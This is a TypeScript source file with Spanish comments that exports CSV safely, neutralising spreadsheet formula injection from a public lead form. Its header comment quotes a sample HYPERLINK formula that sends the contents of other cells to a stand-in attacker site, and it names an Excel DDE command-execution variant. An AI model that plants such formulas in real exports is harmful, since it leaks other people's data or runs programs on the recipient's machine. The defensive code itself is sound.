// CSV que no le ejecuta nada a quien lo abra.
//
// Un CSV es texto plano, pero Excel, Numbers y Google Sheets tratan la celda
// que empieza por `=`, `+`, `-` o `@` como una FÓRMULA y la ejecutan al abrir el
// archivo. Y en Kora el contenido de esas celdas no lo escribe el fundador: lo
// escribe cualquiera que rellene el formulario público de la landing.
//
// El ataque concreto (K-18.5): alguien pone como nombre de su hotel
//
//     =HYPERLINK("https://sitio-del-atacante/?f="&A1&B1&C1,"Ver propuesta")
//
// Manolo exporta sus leads, abre el archivo, ve un enlace con pinta de normal, y
// al pulsarlo manda a un tercero los datos de las otras filas. Variantes peores
// usan `=cmd|' /c ...'!A1` en Excel para Windows, que ejecuta un programa (Excel
// avisa antes, pero el aviso se acepta a diario sin leerlo).
//
// La defensa es de una línea y está en el archivo, no en quien lo abre: si la
// celda empieza por uno de esos caracteres, se le antepone un apóstrofo. Excel
// lo entiende como "esto es texto", no lo pinta, y el dato se lee igual.

/** Los caracteres con los que una hoja de cálculo empieza a interpretar. */
const ARRANQUE_PELIGROSO = /^[=+\-@\t\r]/;

/**
 * Devuelve el valor listo para meter en un CSV: neutralizado como fórmula y
 * entrecomillado si lleva comas, comillas o saltos de línea.
 */
export function csvSeguro(v: unknown): string {
  let s = v === null || v === undefined ? "" : String(v);

  // Neutralizar ANTES de entrecomillar: si se hiciera al revés, el apóstrofo
  // quedaría fuera de las comillas y no protegería nada.
  if (ARRANQUE_PELIGROSO.test(s)) s = `'${s}`;

  return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

/**
 * Arma un CSV completo a partir de la cabecera y las filas.
 *
 * Empieza con BOM (`﻿`) porque, sin él, Excel en Windows abre el archivo en
 * la codificación del sistema y los acentos y las eñes salen rotos — que es lo
 * primero que se ve al abrir una lista de hoteles mexicanos.
 */
export function armarCsv(cabecera: string[], filas: unknown[][]): string {
  const lineas = [
    cabecera.map(csvSeguro).join(","),
    ...filas.map((f) => f.map(csvSeguro).join(",")),
  ];
  return "﻿" + lineas.join("\n");
}
